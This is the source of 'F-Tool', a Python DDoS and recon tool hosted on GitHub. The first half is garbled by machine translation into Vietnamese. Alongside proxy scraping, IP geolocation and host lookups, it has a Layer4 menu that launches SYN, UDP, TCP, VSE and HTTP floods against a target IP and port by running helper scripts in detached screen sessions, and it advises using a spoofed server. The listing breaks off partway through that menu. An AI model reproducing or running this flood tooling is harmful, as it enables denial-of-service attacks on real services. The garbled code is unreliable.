Chuyển đến nội dung

FDc0d3
/
F-Tool
Công cộng
Mã số
Vấn đề
Yêu cầu kéo
Hành động
Dự án
Wiki
Bảo vệ
Thông tin chi tiết
 chính 
F-Tool/ F-Tool.py

FDc0d3 666
…
 1 người đóng góp
722 dòng (666 sloc)  30,5 KB
#! / usr / bin / env python3

từ  nhập  khẩu tắt  mà
từ  phân tích cú pháp nhập urllib  
từ  hệ thống  nhập khẩu  hệ điều hành
nhập  quy trình con
nhập  ngẫu nhiên
nhập  hệ điều hành
nhập  hệ thống
 thời gian nhập khẩu
nhập  json
 thời gian nhập khẩu
thử : # pip3 install httpx request speedtest màu sắc
	kiểm tra tốc độ nhập  khẩu
	nhập khẩu  màu sắc
	 yêu cầu nhập khẩu
	nhập  httpx
ngoại trừ  Exception  as  e :
	sys . thoát ra ( e )


lớp  màu :
	bức tranh màu . init ( autoreset = True )
	LB  =  màu sắc . Trước . LIGHTBLUE_EX
	LC  =  màu sắc . Trước . LIGHTCYAN_EX
	LG  =  màu sắc . Trước . LIGHTGREEN_EX
	LR  =  màu sắc . Trước . LIGHTRED_EX
	LY  =  phim trường . Trước . LIGHTYELLOW_EX
	ĐẶT LẠI  =  ảnh màu . Trước . CÀI LẠI


Lớp học  Trang chủ :
	def  __init__ ( bản thân ,
	giúp đỡ ,
	dev ):
		bản thân . help  =  giúp đỡ
		bản thân . dev  =  nhà phát triển

	def  styleText ( self , text ):
		cho  hoạt ảnh  trong  văn bản :
			sys . stdout . viết ( hoạt hình )
			sys . stdout . tuôn ra ()
			nếu  hoạt ảnh  ! =  "." :
				thời gian . ngủ ( 0,01 )
			khác :
				thời gian . ngủ ( 1 )

	def  home ( self ): # don’t edit this banner lol
		print ( f "" "
                        { Màu sắc . LG } ╔
    { Màu sắc . LC } ╔ppers { Màu sắc . LB } ╔╦╗╔       Màu sắc . LG } ║ { Màu sắc . LR } Đã tạo: { Màu . LY } 5/3/2022     { Màu . LG } ║
    { Màu sắc . LC } ╠╣ { Màu sắc . LB } { Màu sắc . LR } ─── { Màu sắc . LB } ║ ║ ║║ ║║       { Màu sắc . LG } ║ { Màu sắc . LR } Đã cập nhật: { Màu . LY } 8/3/2022     { Màu sắc . LG } ║
    { Màu sắc . LC } ╚ { Màu sắc . LB }     ╩ ╚ _ _ LG } v2   { Màu sắc . LG } ║ { Màu sắc . LB } Đơn giản nhưng mạnh mẽ XD { Màu sắc . LG } ║
                        { Màu sắc . LG } ╚pperspris domains domainsboardsboardsboardsboardsboardsboardsboardsboardsboardsboardsprisoverprisoverprisoverprisoverprisoverpris Internet
    { Màu sắc . LR } [ { Màu . LG } > Made with ☕ By FDc0d3 & Aya     { Color . LG } < { Màu sắc . LR } ] "" ")
		print ( Màu . LC + "Loại" + Màu . LB + "'HELP'" + Màu . LC + "để xem tất cả các lệnh \ n \ n " )
		in ( Màu . LR + "[" + Màu . LG + "01" + Màu . LR + "]" + Màu . LC + "Proxy" )
		in ( Màu . LR + "[" + Màu . LG + "02" + Màu . LR + "]" + Màu . LC + "WebTool" )
		in ( Màu . LR + "[" + Màu . LG + "03" + Màu . LR + "]" + Màu . LC + "L4 / L7 / BBoS" )
		in ( Màu . LR + "[" + Màu . LG + "04" + Màu . LR + "]" + Màu . LC + "SpeedTest" )
		print ( " \ n " )
		trong khi  Đúng :
			thử :
				sys . stdout . ghi ( Màu . LB + "╔ + Màu . LR + " [" + Màu . LG + " F-Toolv2 " + Màu . LB + " @ " + Màu . LG + " Trang chủ " + Màu . LR + "]" + Màu sắc . LB + " \ n ╚pperspris>" + Màu sắc . ĐẶT LẠI )
				option  =  input ()
				nếu  tùy chọn  ==  '01'  hoặc  tùy chọn  ==  '1' :
					hệ điều hành . hệ thống ( 'rõ ràng' )
					Dụng cụ . proxy ( tùy chọn )
				 tùy chọn  elif ==  '02'  hoặc  tùy chọn  ==  '2' :
					hệ điều hành . hệ thống ( 'rõ ràng' )
					Dụng cụ . webtools ()
				 tùy chọn   elif ==  '03'  hoặc  tùy chọn  ==  '3' :
					hệ điều hành . hệ thống ( 'rõ ràng' )
					Dụng cụ . bbos ()
				 tùy chọn  elif ==  '04'  hoặc  tùy chọn  ==  '4' :
					hệ điều hành . hệ thống ( 'rõ ràng' )
					Dụng cụ . spdtest ()
				elif  option  ==  'ref'  hoặc  option  ==  'REF' :
					bản thân . nhà ()
				elif  option  ==  'home'  hoặc  option  ==  'HOME' :
					bản thân . nhà ()
				elif  option  ==  'clear'  hoặc  option  ==  'CLEAR' :
					hệ điều hành . hệ thống ( 'rõ ràng' )
					F_Tool . nhà ()
				elif  option  ==  'help'  hoặc  option  ==  'HELP' :
					in ( tự trợ giúp )
				elif  option  ==  'dev'  hoặc  option  ==  'DEV' :
					print ( tự . dev )
				elif  option  ==  'exit'  hoặc  option  ==  'EXIT' :
					quy trình con . run ([ 'pkill -f F-Tool.py' ], shell = True )
				elif  option  ==  'stop'  hoặc  option  ==  'STOP' :
					quy trình con . run ([ 'pkill screen' ], shell = True )
					print ( f " { Color . LG } [!] Attack Stopped!" )
				 tùy chọn  elif ==  "" :
					đi qua
				khác :
					print ( Màu . LR + "lệnh:" + Màu . LG + f " { option } " + Màu . LR + "không tìm thấy" )
			ngoại trừ  KeyboardInterrupt :
				sys . thoát ra ( 0 )


class  response_url :
	def  __init__ ( bản thân ,
	tiêu đề ):
		bản thân . headers  =  tiêu đề

	 tra cứu def ( tự , url ):
		thử :
			nếu  url  ==  '' :
				trả lại  Màu sắc . LG + "[" + Màu . LR + "!" + Màu sắc . LG + "]" + Màu . LR + "URL không hợp lệ"
			resp  =  yêu cầu . get ( f "http://ip-api.com/json/ { url } ? fields = status, message, country, countryCode, regionName, city, timezone, asname, isp, org, reverse, query" , headers = self . tiêu đề ). json ()
			info  =  Màu sắc . Địa chỉ IP LG + "[+]:" + resp [ 'query' ] + " \ n " + Màu . LG + "[+] Tên máy chủ:" + resp [ 'ngược' ] + " \ n " + Màu . LG + "[+] ISP:" + resp [ 'isp' ] + " \ n " + Màu . LG +              "[+] Tổ chức:" +  resp [ 'org' ] +  " \ n "  + Màu . LG +  "[+] Quốc gia:"  +  resp [ 'country' ] +  ""  +  "("  +  resp [ 'countryCode' ] +  ")"  +  " \ n "  + Màu . LG +  "[+] Khu vực:"  +  resp [ 'regionName'  Màu sắc . LG +  "[+] Thành phố:"  +  resp [ 'city' ] +  " \ n "  + Màu . LG +  "[+] ASN:"  +  resp [ 'asname' ] +  " \ n "  + Màu . LG +  "[+] Múi giờ:"  +  resp [ 'múi giờ' ]

			if  res [ 'status' ] ==  'thành công' :
				trả lại  thông tin
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()

			info = Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])

			if resp['status'] == 'success':
				return info

		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:
			trả lại  Màu sắc . LR + "Lỗi: Kiểm tra kết nối Internet của bạn."

	def  http_status ( tự , url ):
		thử :
			parser  =  phân tích cú pháp . urlparse ( url )
			nếu  phân tích cú pháp . lược đồ  ==  "" :
				url  =  "http: //" + url
			resp  =  httpx . get ( url , headers = self . headers )
			trạng thái  =  resp . status_code
			nếu  trạng thái  ==  200 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( resp . Trôi qua . Total_seconds (), 3 ) } Giây | { status } (OK)"
			 trạng thái  elif ==  301 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( tương ứng đã trôi qua . Total_seconds ( ), 3 ) } Giây | { status } (Đã di chuyển vĩnh viễn)"
			 trạng thái  elif ==  302 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Found)"
			 trạng thái  elif ==  303 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( resp . Trôi qua . Total_seconds (), 3 ) } Giây | { status } (Xem Khác)"
			 trạng thái  elif ==  307 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Temporary Redirect)"
			 trạng thái  elif ==  400 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Unauthorized)"
			 trạng thái  elif ==  410 :
				trả lại  Màu sắc . LG + f "[+] Kết quả: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Gone)"
			 trạng thái  elif ==  401 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Yêu cầu không hợp lệ)"
			 trạng thái  elif ==  403 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Forbidden)"
			 trạng thái  elif ==  404 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Not Found)"
			 trạng thái  elif ==  429 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Giây | { status } (Với Nhiều Yêu cầu)"
			 trạng thái  elif ==  500 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Internal Server Error)"
			 trạng thái  elif ==  502 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Bad Gateway)"
			 trạng thái  elif ==  503 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Giây | { status } (Dịch vụ Không khả dụng)"
			 trạng thái  elif ==  504 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Gateway Timeout)"
			 trạng thái  elif ==  507 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Không đủ bộ nhớ)"
			 trạng thái  elif ==  508 :
				trả lại  Màu sắc . LR + f "[+] Kết quả: Lỗi máy chủ | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Loop Detected)"
			khác :
				trả lại  Màu sắc . LR + f "[+] Kết quả: (Hết thời gian chờ kết nối)"

		ngoại trừ  httpx . Hết giờ ngoại lệ :
			trả lại  Màu sắc . LR + f "[+] Kết quả: (Hết thời gian chờ kết nối)"
		ngoại trừ  httpx . ConnectError :
			trả lại  Màu sắc . LR + f "[+] Kết quả: Xảy ra lỗi"
		ngoại trừ  httpx . Giao thức không được hỗ trợ :
			trả lại  Màu sắc . LG + "[" + Màu . LR + "!" + Màu sắc . LG + "]" + Màu . LR + "URL không hợp lệ"

	def  findhost ( self , host ):
		thử :
			resp  =  yêu cầu . get ( f "https://api.hackertarget.com/hostsearch/?q= { host } " , headers = self . headers )

			info  =  tương ứng . chữ
			nếu  thông tin  ==  'lỗi máy chủ không hợp lệ' :
				trả lại  Màu sắc . LG + "[" + Màu . LR + "!" + Màu sắc . LG + "]" + Màu . LR + "URL không hợp lệ"
			khác :
				trả lại  Màu sắc . LG + thông tin
		ngoại trừ  các yêu cầu . các trường hợp ngoại lệ . Lỗi kết nối :
			trả lại  Màu sắc . LR + "Lỗi: Kiểm tra kết nối Internet của bạn."

	 liên kết giải nén def ( tự , url ):
		thử :
			resp  =  yêu cầu . get ( f "https://api.hackertarget.com/pagelinks/?q= { url } " , headers = self . headers )

			info  =  tương ứng . chữ
			nếu  thông tin  ==  "url đầu vào không hợp lệ" :
				trả lại  Màu sắc . LG + "[" + Màu . LR + "!" + Màu sắc . LG + "]" + Màu . LR + "URL không hợp lệ"
			elif  info  ==  "lỗi lấy liên kết" :
				trả lại  Màu sắc . LG + "[" + Màu . LR + "!" + Màu sắc . LG + "]" + Màu . LR + "Không tìm thấy liên kết nào!"
			khác :
				trả lại  Màu sắc . LG + thông tin
		ngoại trừ  các yêu cầu . các trường hợp ngoại lệ . Lỗi kết nối :
			trả lại  Màu sắc . LR + "Lỗi: Kiểm tra kết nối Internet của bạn."


 Công cụ lớp học :
	def  __init__ ( bản thân ,
	giúp đỡ ,
	nhà phát triển ,
	tiêu đề ):
		bản thân . help  =  giúp đỡ
		bản thân . dev  =  nhà phát triển
		bản thân . headers  =  tiêu đề

	 proxy def ( tự , mới ):
		thử :
			với  open ( "utils / url.json" , 'r' ) là  p :
				read_url  =  p . đọc ()
				readjson  =  json . tải ( read_url )
		ngoại trừ  FileNotFoundError :
			sys . exit ( f " { Color . LR } ERROR: { Color . RESET } Tệp: 'utils' NotFound" )
		if  new  ==  'ref'  hoặc  new  ==  'REF'  hoặc  new  ==  'clear'  hoặc  new  ==  'CLEAR' :
			hệ điều hành . hệ thống ( 'rõ ràng' )
			F_Tool . styleText ( "[*] Đang tải xuống Proxy Mới ..." )
		khác :
			F_Tool . styleText ( "[*] Đang tải xuống tất cả proxy ..." )
		thử :
			http   =  yêu cầu . get ( readjson [ 'Proxy' ] [ 0 ] [ 'url' ], headers = self . headers ). chữ
			http  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 1 ] [ 'url' ], headers = self . headers ). chữ
			http  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 2 ] [ 'url' ], headers = self . headers ). chữ
			http  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 3 ] [ 'url' ], headers = self . headers ). chữ
			https  =  yêu cầu . get ( readjson [ 'Proxy' ] [ 4 ] [ 'url' ], headers = self . headers ). chữ
			https  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 5 ] [ 'url' ], headers = self . headers ). chữ
			https  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 6 ] [ 'url' ], headers = self . headers ). chữ
			https  + =   yêu cầu . get ( readjson [ 'Proxy' ] [ 7 ] [ 'url' ], headers = self . headers ). chữ
			vớ4   =  yêu cầu . get ( readjson [ 'Proxy' ] [ 8 ] [ 'url' ], headers = self . headers ). chữ
			vớ4  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 9 ] [ 'url' ], headers = self . headers ). chữ
			vớ4  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 10 ] [ 'url' ], headers = self . headers ). chữ
			vớ4  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 11 ] [ 'url' ], headers = self . headers ). chữ
			vớ5  =  yêu cầu . get ( readjson [ 'Proxy' ] [ 12 ] [ 'url' ], headers = self . headers ). chữ
			vớ5  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 13 ] [ 'url' ], headers = self . headers ). chữ
			vớ5  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 14 ] [ 'url' ], headers = self . headers ). chữ
			vớ5  + =  yêu cầu . get ( readjson [ 'Proxy' ] [ 15 ] [ 'url' ], headers = self . headers ). chữ
			hệ điều hành . hệ thống ( 'rõ ràng' )
		ngoại trừ  các yêu cầu . các trường hợp ngoại lệ . Lỗi kết nối :
			sys . thoát ( Màu . LR + "Lỗi: Kiểm tra kết nối Internet của bạn." )

		print ( f "" " { Màu . LG }
     ___ _
    / _ \ _ __ _____ _ (_) ___ ___
   / / _) / '__ / _ \ \ / / | / _ \ / __ |
  / ___ / | | | (_)> <| | __ / \ __)
  \ / | _ | \ ___ / _ / \ _ \ _ | \ ___ || ___ /
"" " )
		in ( Màu . LR + "[" + Màu . LG + "01" + Màu . LR + "]" + Màu . LC + "HTTP PROXY" )
		in ( Màu . LR + "[" + Màu . LG + "02" + Màu . LR + "]" + Màu . LC + "HTTPS PROXY" )
		in ( Màu . LR + "[" + Màu . LG + "03" + Màu . LR + "]" + Màu . LC + "SOCKS4 PROXY" )
		in ( Màu . LR + "[" + Màu . LG + "04" + Màu . LR + "]" + Màu . LC + "SOCKS5 PROXY" )
		print ( " \ n " )
		trong khi  Đúng :
				sys . stdout . write ( Màu . LB + "╔ ═ +" + Màu . LR + "[" + Màu . LG + "F-Toolv2" + Màu . LB + "@" + Màu . LG + "Proxy" + Màu . LR + "]" + Màu sắc . LB + " \ n ╚pperspris>" + Màu sắc . ĐẶT LẠI )
				option  =  input ()
				nếu  tùy chọn  ==  '01'  hoặc  tùy chọn  ==  '1' :
					với  open ( "http.txt" , 'w' ) là  p :
						p . ghi ( http )
					in ( Màu . LG + "[+]" + Màu . LC + "HTTP Đã lưu vào http.txt" )
				 tùy chọn  elif ==  '02'  hoặc  tùy chọn  ==  '2' :
					với  open ( "https.txt" , 'w' ) là  p :
						p . ghi ( https )
					in ( Màu . LG + "[+]" + Màu . LC + "HTTPS thành https.txt" )
				 tùy chọn  elif ==  '03'  hoặc  tùy chọn  ==  '3' :
					với  open ( "vớ4.txt" , 'w' ) là  p :
						p . ghi ( vớ4 )
					print ( Màu . LG + "[+]" + Màu . LC + "SOCKS4 Đã lưu vào vớ4.txt" )
				 tùy chọn  elif ==  '04'  hoặc  tùy chọn  ==  '4' :
					với  open ( "vớ5.txt" , 'w' ) là  p :
						p . ghi ( vớ5 )
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
				elif option == 'ref' or option == 'REF':
					self.proxy(option)
				elif option == 'home' or option == 'HOME':
					F_Tool.home()
				elif option == 'clear' or option == 'CLEAR':
					os.system('clear')
					self.proxy(option)
				elif option == 'help' or option == 'HELP':
					print(self.help)
				elif option == 'dev' or option == 'DEV':
					print(self.dev)
				elif option == 'exit' or option == 'EXIT':
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] Attack Stopped!")
				elif option == "":
					pass
				else:
					print ( Màu . LR + "lệnh:" + Màu . LG + f " { option } " + Màu . LR + "không tìm thấy" )

	def  webtools ( tự ):
		print ( f "" " { Màu . LG }
   __ __ _ _____ _
  / / / \ \ \ ___ | | __ / __ \ ___ ___ | |
  \ \ / \ / / _ \ '_ \ / / \ / _ \ / _ \ | |
   \ / \ / __ / | _) / / | (_) | (_) | |
    \ / \ / \ ___ | _.__ / \ / \ ___ / \ ___ / | _ |
"" " )
		in ( Màu . LR + "[" + Màu . LG + "01" + Màu . LR + "]" + Màu . LC + "LOOKUP" )
		in ( Màu . LR + "[" + Màu . LG + "02" + Màu . LR + "]" + Màu . LC + "IP INFO" )
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP STATUS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" FIND HOST")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = parse.urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option == '02' or option == '2':
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option == '03' or option == '3':
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option == '04' or option == '4':
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option == '05' or option == '5':
				while True:
					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).extractlink(excractlink))
					break
			elif option == 'ref' or option == 'REF':
				self.webtools()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.webtools()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def spdtest(self):
		print(f"""{Color.LG}
   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|
""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()

			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")


	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				os.system('clear');self.l4()
			elif option == '02' or option == '2':
				os.system('clear');self.l7()
			elif option == 'ref' or option == 'REF':
				self.bbos()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.bbos()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l4(self):
		print(f"""{Color.LG}
     __                       _  _
    / /  __ _ _   _  ___ _ __| || |
   / /  / _` | | | |/ _ \ '__| || |_
  / /__| (_| | |_| |  __/ |  |__   _|
  \____/\__,_|\__, |\___|_|     |_|
              |___/
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '05' or option == '5':
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l4()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l4()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
